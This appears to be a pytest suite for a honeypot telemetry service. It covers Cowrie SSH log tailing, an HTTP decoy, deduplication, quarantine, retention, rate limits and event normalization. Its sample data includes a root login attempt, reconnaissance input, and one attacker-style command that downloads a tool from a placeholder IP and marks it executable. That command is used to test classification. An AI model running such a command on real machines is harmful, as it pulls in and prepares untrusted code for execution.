from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

import httpx

from .conftest import make_event


def _cowrie_log(tmp_path):
    lines = [
        {
            "eventid": "cowrie.session.connect",
            "session": "cv-1",
            "src_ip": "203.0.113.201",
            "timestamp": "2026-10-20T09:00:00Z",
            "sensor": "cowrie-lab",
        },
        {
            "eventid": "cowrie.login.failed",
            "session": "cv-1",
            "src_ip": "203.0.113.201",
            "timestamp": "2026-10-20T09:00:05Z",
            "username": "root",
            "password": "not-a-real-password",
            "sensor": "cowrie-lab",
        },
        {
            "eventid": "cowrie.command.input",
            "session": "cv-1",
            "src_ip": "203.0.113.201",
            "timestamp": "2026-10-20T09:00:09Z",
            "input": "uname -a",
            "sensor": "cowrie-lab",
        },
    ]
    path = tmp_path / "cowrie.json"
    path.write_text("\n".join(json.dumps(line) for line in lines) + "\n", encoding="utf-8")
    return path


def test_two_independent_sources_are_normalized_stored_and_traceable(client, admin_headers, tmp_path):
    from app.deception.cowrie_adapter import CowrieTailer
    from app.deception.http_decoy import start_decoy

    tailer = CowrieTailer(_cowrie_log(tmp_path), state_path=tmp_path / "offset")
    report = tailer.poll()
    assert report["accepted"] == 3

    decoy = start_decoy(host="127.0.0.1", port=0, profile_name="http-wordpress")
    try:
        httpx.get(f"http://127.0.0.1:{decoy.port}/", timeout=5.0)
        httpx.post(
            f"http://127.0.0.1:{decoy.port}/wp-login.php",
            data={"username": "operator", "password": "never-store-me"},
            timeout=5.0,
        )
    finally:
        decoy.stop()

    events = client.get("/api/v1/events?limit=100", headers=admin_headers).json()
    assert events["total"] >= 5
    collectors = {item["provenance"]["collector"] for item in events["items"]}
    assert {"cowrie", "http-decoy"} <= collectors
    assert any(item["event_type"] == "honeypot.ssh.command" for item in events["items"])
    assert any(item["event_type"] == "honeypot.http.credential_attempt" for item in events["items"])

    cowrie_event = next(item for item in events["items"] if item["provenance"]["collector"] == "cowrie")
    assert cowrie_event["source_ip"] == "203.0.113.201"
    assert cowrie_event["session_id"].startswith("cowrie:")
    assert cowrie_event["features"]["action"].startswith("recon:")

    sources = client.get("/api/v1/sources", headers=admin_headers).json()["sources"]
    names = {source["source"] for source in sources}
    assert "honeypot:cowrie" in names
    assert "honeypot:http-decoy" in names


def test_duplicate_delivery_is_counted_not_stored_twice(client, sensor_headers, admin_headers):
    event = make_event(session_id="dedup-session")
    first = client.post("/api/v1/ingest/events", json=[event], headers=sensor_headers).json()
    second = client.post("/api/v1/ingest/events", json=[event], headers=sensor_headers).json()
    assert first["accepted"] == 1
    assert second["duplicates"] == 1 and second["accepted"] == 0
    total = client.get("/api/v1/events", headers=admin_headers).json()["total"]
    assert total == 1


def test_quarantine_preserves_rejected_payload(client, sensor_headers, admin_headers):
    bad = make_event(severity="not-a-severity", session_id="quarantine-session")
    report = client.post("/api/v1/ingest/events", json=[bad], headers=sensor_headers).json()
    assert report["rejected"] == 1
    quarantine_id = report["results"][0]["quarantine_id"]
    items = client.get("/api/v1/quarantine", headers=admin_headers).json()["items"]
    stored = next(item for item in items if item["id"] == quarantine_id)
    assert stored["reason_code"] == "schema_validation"
    assert stored["payload_bytes"] > 0
    assert "raw" not in stored  # payload is not echoed through the list endpoint


def test_retention_purges_only_expired_events(client, sensor_headers, admin_headers):
    old = make_event(
        session_id="retention-old",
        occurred_at=(datetime.now(timezone.utc) - timedelta(days=200)).isoformat(),
    )
    fresh = make_event(session_id="retention-fresh")
    client.post("/api/v1/ingest/events", json=[old, fresh], headers=sensor_headers)

    from app.telemetry.repository import purge_expired

    removed = purge_expired(datetime.now(timezone.utc).isoformat())
    assert removed == 1
    events = client.get("/api/v1/events?limit=10", headers=admin_headers).json()
    assert events["total"] == 1
    assert events["items"][0]["session_id"] == "retention-fresh"


def test_event_window_cap_keeps_the_newest_events(client, sensor_headers):
    """Crossing the load cap must not silently correlate a stale prefix."""
    now = datetime.now(timezone.utc)
    batch = [
        make_event(
            session_id=f"cap-{index}",
            occurred_at=(now - timedelta(minutes=3 - index)).isoformat(),
        )
        for index in range(3)
    ]
    response = client.post("/api/v1/ingest/events", json=batch, headers=sensor_headers)
    assert response.status_code == 202, response.text
    assert response.json()["accepted"] == 3

    from app.telemetry.repository import events_in_window

    events, truncated = events_in_window(
        (now - timedelta(hours=1)).isoformat(), now.isoformat(), limit=2
    )
    assert truncated is True
    assert [event["session_id"] for event in events] == ["cap-1", "cap-2"]

    complete, complete_truncated = events_in_window(
        (now - timedelta(hours=1)).isoformat(), now.isoformat(), limit=10
    )
    assert complete_truncated is False
    assert [event["session_id"] for event in complete] == ["cap-0", "cap-1", "cap-2"]


def test_sliding_window_limiter_enforces_bounds():
    from app.core.limits import SlidingWindowLimiter

    limiter = SlidingWindowLimiter(3, 60)
    outcomes = [limiter.allow("key")[0] for _ in range(4)]
    assert outcomes == [True, True, True, False]
    assert limiter.allow("other-key")[0] is True


def test_limiter_caps_distinct_keys_without_evicting_active_buckets():
    from app.core.limits import SlidingWindowLimiter

    limiter = SlidingWindowLimiter(10, 60, max_keys=2)
    assert limiter.allow("a")[0] is True
    assert limiter.allow("b")[0] is True
    assert limiter.allow("c")[0] is False
    assert limiter.allow("a")[0] is True


def test_ingestion_rate_limit_counts_batch_records(client, sensor_headers, monkeypatch):
    from app.api import deps
    from app.core.config import reset_settings_cache

    monkeypatch.setenv("TP_INGEST_RATE_LIMIT_PER_MINUTE", "2")
    reset_settings_cache()
    deps.ingest_limiter.cache_clear()

    batch = [make_event(session_id=f"rate-batch-{index}") for index in range(3)]
    response = client.post("/api/v1/ingest/events", json=batch, headers=sensor_headers)
    assert response.status_code == 429
    assert response.json()["error"]["code"] == "rate_limited"

    single = client.post(
        "/api/v1/ingest/events",
        json=[make_event(session_id="rate-single-1")],
        headers=sensor_headers,
    )
    assert single.status_code == 202


def test_normalization_is_deterministic_and_bounded():
    from app.telemetry.normalize import normalize_event, normalize_path_template
    from app.schemas.event import EventIn

    payload = make_event(
        features={"command": "wget http://198.51.100.9/tool-1234 && chmod +x tool-1234"}
    )
    first = normalize_event(EventIn.model_validate(payload))
    second = normalize_event(EventIn.model_validate(payload))
    assert first == second
    assert first["category"] == "download"
    assert normalize_path_template("/users/12345/profile?x=1") == "/users/{n}/profile"
